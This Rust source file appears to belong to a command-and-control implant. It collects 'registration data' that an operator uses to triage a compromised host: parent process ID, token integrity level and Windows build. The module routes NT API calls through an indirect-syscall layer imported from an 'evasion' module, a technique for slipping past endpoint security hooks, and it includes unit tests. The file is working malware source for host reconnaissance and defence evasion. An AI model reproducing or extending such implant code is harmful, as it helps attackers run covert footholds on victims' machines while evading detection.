//! Real registration data (ABR-T002 companion): the values the operator
//! triages a target with come from NT APIs — through the indirect-syscall
//! layer where a syscall exists — instead of stale environment variables
//! or placeholders.
//!
//! - `ppid`: `NtQueryInformationProcess(ProcessBasicInformation)`
//!   `InheritedFromUniqueProcessId` on the current process.
//! - `integrity`: the mandatory-integrity SID RID from
//!   `NtQueryInformationToken(TokenIntegrityLevel)`, mapped to 0..=5
//!   (0 unknown, 1 low, 2 medium, 3 high, 4 system, 5 protected).
//! - `os_build`: `RtlGetVersion` (the `OS` environment variable is the
//!   literal string "Windows_NT" and was never a build number).

use crate::evasion::syscalls;

const CURRENT_PROCESS: usize = usize::MAX;
const STATUS_MASK: u32 = 0x8000_0000;

#[repr(C)]
#[derive(Default, Clone, Copy)]
struct ProcessBasicInformation {
    exit_status: isize, // NTSTATUS + padding
    peb_base: usize,
    affinity_mask: usize,
    base_priority: isize,
    unique_pid: usize,
    inherited_pid: usize,
}

/// Parent PID of the implant process via ProcessBasicInformation.
pub fn ppid() -> Option<u32> {
    let query = unsafe { syscalls::resolve("NtQueryInformationProcess") }?;
    let mut pbi = ProcessBasicInformation::default();
    let mut returned = 0usize;
    let status = unsafe {
        syscalls::dispatch6(
            query,
            CURRENT_PROCESS,
            0, // ProcessBasicInformation
            &mut pbi as *mut ProcessBasicInformation as usize,
            std::mem::size_of::<ProcessBasicInformation>(),
            &mut returned as *mut usize as usize,
            0,
        )
    };
    if (status as u32) & STATUS_MASK != 0 {
        return None;
    }
    u32::try_from(pbi.inherited_pid)
        .ok()
        .filter(|pid| *pid != 0)
}

const TOKEN_QUERY: usize = 0x0008;

/// Mandatory integrity level 0..=5 of the implant's own token.
pub fn integrity() -> Option<u8> {
    let open = unsafe { syscalls::resolve("NtOpenProcessToken") }?;
    let query = unsafe { syscalls::resolve("NtQueryInformationToken") }?;
    let close = unsafe { syscalls::resolve("NtClose") }?;
    let mut token: usize = 0;
    let status = unsafe {
        syscalls::dispatch6(
            open,
            CURRENT_PROCESS,
            TOKEN_QUERY,
            &mut token as *mut usize as usize,
            0,
            0,
            0,
        )
    };
    if (status as u32) & STATUS_MASK != 0 || token == 0 {
        return None;
    }
    // TOKEN_MANDATORY_LABEL { SID *Label } — the SID itself is written
    // into the caller's buffer (28 bytes observed; 64 gives headroom).
    let mut buffer = [0u8; 64];
    let mut returned = 0usize;
    let status = unsafe {
        syscalls::dispatch6(
            query,
            token,
            25, // TokenIntegrityLevel
            buffer.as_mut_ptr() as usize,
            buffer.len(),
            &mut returned as *mut usize as usize,
            0,
        )
    };
    unsafe { syscalls::dispatch6(close, token, 0, 0, 0, 0, 0) };
    if (status as u32) & STATUS_MASK != 0 {
        return None;
    }
    let sid = usize::from_le_bytes([
        buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5], buffer[6], buffer[7],
    ]);
    let start = buffer.as_ptr() as usize;
    if sid < start || sid + 8 > start + buffer.len() {
        return None;
    }
    let sid_offset = sid - start;
    let sub_authorities = buffer[sid_offset + 1] as usize;
    if sub_authorities == 0 || sub_authorities > 15 {
        return None;
    }
    let rid_offset = sid_offset + 8 + 4 * (sub_authorities - 1);
    if rid_offset + 4 > buffer.len() {
        return None;
    }
    let rid = u32::from_le_bytes([
        buffer[rid_offset],
        buffer[rid_offset + 1],
        buffer[rid_offset + 2],
        buffer[rid_offset + 3],
    ]);
    Some(match rid {
        0x1000 => 1,
        0x2000 => 2,
        0x3000 => 3,
        0x4000 => 4,
        0x5000 => 5,
        _ => 0,
    })
}

#[repr(C)]
struct OsVersionInfoW {
    size: u32,
    major: u32,
    minor: u32,
    build: u32,
    platform: u32,
    csd: [u16; 128],
}

/// `major.minor.build` from RtlGetVersion.
pub fn os_build() -> Option<String> {
    let address = unsafe { syscalls::export_address("ntdll.dll", "RtlGetVersion") }?;
    let rtl_get_version: unsafe extern "system" fn(*mut OsVersionInfoW) -> i32 =
        unsafe { std::mem::transmute(address) };
    let mut info = OsVersionInfoW {
        size: std::mem::size_of::<OsVersionInfoW>() as u32,
        major: 0,
        minor: 0,
        build: 0,
        platform: 0,
        csd: [0; 128],
    };
    if unsafe { rtl_get_version(&mut info) } != 0 {
        return None;
    }
    Some(format!("{}.{}.{}", info.major, info.minor, info.build))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ppid_is_real() {
        let ppid = ppid().expect("ppid via ProcessBasicInformation");
        assert_ne!(ppid, 0, "inherited pid must not be zero on a live process");
    }

    #[test]
    fn integrity_is_in_range() {
        let level = integrity().expect("integrity via token SID");
        assert!(level <= 5, "integrity {level} outside 0..=5");
    }

    #[test]
    fn os_build_is_numeric() {
        let build = os_build().expect("os build via RtlGetVersion");
        let parts: Vec<_> = build.split('.').collect();
        assert_eq!(parts.len(), 3, "expected major.minor.build, got {build}");
        assert!(parts.iter().all(|p| p.parse::<u32>().is_ok()));
    }
}
